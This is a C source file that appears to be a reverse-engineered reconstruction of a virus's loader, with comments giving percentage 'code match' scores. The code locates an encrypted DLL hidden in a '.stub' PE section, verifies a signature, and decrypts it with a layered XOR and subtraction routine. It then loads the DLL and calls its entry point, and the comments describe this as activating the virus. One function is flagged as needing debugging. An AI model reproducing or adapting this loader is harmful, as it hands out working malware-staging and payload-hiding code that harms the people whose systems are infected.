/******************************************************************************************
  Copyright (C) 2012-2014 Christian Roggia <christian.roggia@gmail.com>

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "2. STUBHandler.h"
#include "6. MemorySections.h"

#include "config.h"
#include "define.h"

// 99% (C) CODE MATCH
void Core_Load(void)
{
	INT32 nCoreLen;			// Length of the section which contains the main DLL
	LPVOID lpCore;			// The pointer to the section which contains the main DLL
	HMODULE hCoreModule;	// The pointer to the loaded main DLL
	TCoreHeader *h;			// Pointer to the header

	// Get the pointer to the section
	if(!Core_GetDLL(&lpCore, &nCoreLen))
		return;
	
	// Get the header
	h = (TCoreHeader *)lpCore;
	
	// Decode the section
	Core_Crypt((BYTE *)((DWORD)lpCore + h->HeaderLength), h->SectionLength);
	
	// Setup everything and get ready to activate the virus
	if(Setup(NULL, (LPVOID)((DWORD)lpCore + h->HeaderLength), h->SectionLength, &hCoreModule))
		return;
	
	// Activate the virus
#	define DLL_FUNC(p, a, b)	{ if(p) ((__tLibraryExecEntry)p)(a, b); }
	DLL_FUNC(GetProcAddress(hCoreModule, ENTRY_FUNC), lpCore, nCoreLen);
	
	FreeLibrary(hCoreModule);
}

// 98% (C) CODE MATCH
void Core_Crypt(BYTE *lpStream, DWORD dwLength)
{
	DWORD i = 4, k, j, l;
	
	for(; i >= 0; i--)
	{
		for(k = 0; k < dwLength; k++)
			lpStream[k] ^= X_CORE_KEY * k;
		
		for(j = 0; j < dwLength / 2; j++)
			lpStream[j] ^= lpStream[((dwLength + 1) / 2) + j];
		
		for(l = dwLength - 1; l >= 1; l--)
			lpStream[l] -= lpStream[l - 1];
	}
}

extern HINSTANCE g_hInstDLL;

// 85% (C) CODE MATCH -> NEED DEBUG
BOOL Core_GetDLL(LPVOID *ppCore, INT32 *pCoreLen)
{
	PIMAGE_NT_HEADERS pImageNT;
	PIMAGE_SECTION_HEADER pImageSection;
	INT32 i;
	DWORD nCoreLen;
	LPVOID lpCore;
	
	// Check the DOS header of the DLL (must be "MZ")
	if(((PIMAGE_DOS_HEADER)g_hInstDLL)->e_magic != MZ_HEADER)
		return FALSE;
	
	// Get the pointer to the PE header
	pImageNT = IMAGE_NT(g_hInstDLL);
	
	// Check the PE header (must be "PE")
	if(pImageNT->Signature != PE_HEADER)
		return FALSE;
	
	// Get the PE Section Table
	pImageSection = SECTION_TABLE(pImageNT);
	i = 0;
	
	// Get the number of sections (5), if it is 0
	// or negative the function fails
	if(pImageNT->FileHeader.NumberOfSections <= 0)
		return FALSE;
	
	// Search the section ".stub" where the encrypted dll
	// is allocated, if not found the function failed
	while(lstrcmpiA((LPCSTR)pImageSection->Name, X_SECTION_NAME))
	{
		++i; ++pImageSection;
		
		// Index out of range
		if(i >= pImageNT->FileHeader.NumberOfSections)
		{
			DEBUG_P("The core section has not been found.")
			return FALSE;
		}
	}
	
	// Get the ".stub" section Virtual Size
	nCoreLen = pImageSection->SizeOfRawData; // (503.808 bytes)
	
	// Check if the Virtual Size is not too small (VirtualSize < 556)
	if(nCoreLen < sizeof(TCoreHeader) + sizeof(DWORD))
	{
		DEBUG_P("The core is too small.")
		return FALSE;
	}
	
	// Get the ".stub" section RVA (Relative Virtual Address) (g_hInstDLL + 0x6000)
	lpCore = (LPVOID)(g_hInstDLL + pImageSection->VirtualAddress);
	
	// Check the header (DWORD) of the RVA section (0xAE39120D)
	if(*(DWORD *)lpCore != X_SIGNATURE)
	{
		DEBUG_P("The core has an invalid signature.")
		return FALSE;
	}
	
	// Remove the header (4 bytes) and put the values in the pointers
	*ppCore		= (LPVOID)((DWORD)lpCore + sizeof(DWORD));
	*pCoreLen	= nCoreLen - sizeof(DWORD);
	
	return TRUE;
}